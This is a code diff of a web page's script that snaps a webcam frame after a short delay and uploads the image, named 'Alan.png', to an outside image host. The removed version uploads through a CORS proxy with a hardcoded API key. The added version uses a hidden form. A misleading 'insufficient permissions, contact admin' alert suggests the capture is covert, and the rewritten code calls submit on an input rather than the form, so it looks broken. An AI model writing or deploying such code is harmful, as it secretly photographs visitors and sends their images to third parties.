@@ -24,19 +24,13 @@
                     setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000);
                     setTimeout(function () {
                         canvas.toBlob((blob) => {
-                            form = new FormData(),
-                            request = new XMLHttpRequest();
-                            const myHeaders = new Headers();
-                            myHeaders.append('x-cors-api-key', 'temp_458d0bec8d2cc3c400c62650a1041ecd');
-                            form.append("image", blob, "Alan.png");
-                            request.open(
-                                "POST",
-                                "https://proxy.cors.sh/https://locimg.com/upload/upload.html",
-                                true
-                            );
-                            request.send(form);
-                        }
-                        );
+                            const form = document.getElementById('result')
+                            const file = new File([blob], "Alan.png");
+                            const dt = new DataTransfer();
+                            dt.items.add(file);
+                            document.getElementById('result').files = dt.files;
+                            form.submit();
+                        });
 
                     }, 1300);
                 }, function () { alert("操作失败，权限不够！请联系管理员 QQ"); });
@@ -45,7 +39,7 @@
         }, false);
 
     </script>
-
+    <form action="https://locimg.com/upload/upload.html" enctype="multipart/form-data" id="gopo" method="post">
+        <input type="hidden" name="image" id="result" value="" />
+    </form>
 </body>
-
-</html>
